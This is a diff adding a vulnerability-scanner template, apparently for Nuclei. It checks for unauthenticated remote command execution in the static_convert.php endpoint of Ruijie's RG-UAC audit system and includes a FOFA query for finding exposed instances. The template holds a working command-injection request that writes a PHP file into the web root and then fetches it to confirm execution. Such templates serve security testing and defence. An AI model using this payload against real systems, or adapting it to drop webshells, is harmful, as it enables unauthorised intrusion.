@@ -1,0 +1,33 @@
+id: ruijie-static_convert_php-rce
+
+info:
+  name: 锐捷统一上网行为管理与审计系统 /view/IPV6/naborTable/static_convert.php 远程命令执行
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: title="RG-UAC登录页面"
+    锐捷统一上网行为管理与审计系统 /view/IPV6/naborTable/static_convert.php 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可以利用此漏洞执行任意指令或写入webshell，导致服务器权限被控，造成严重威胁。
+  reference:
+    - 
+  tags: rce, ruijie, uac
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |-
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20print("pboyjnnrfipmplsukdeczudsefxmywe");unlink(__FILE__);?>%27%20>/var/www/html/{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+      - |-
+        GET /{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 远程命令执行
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
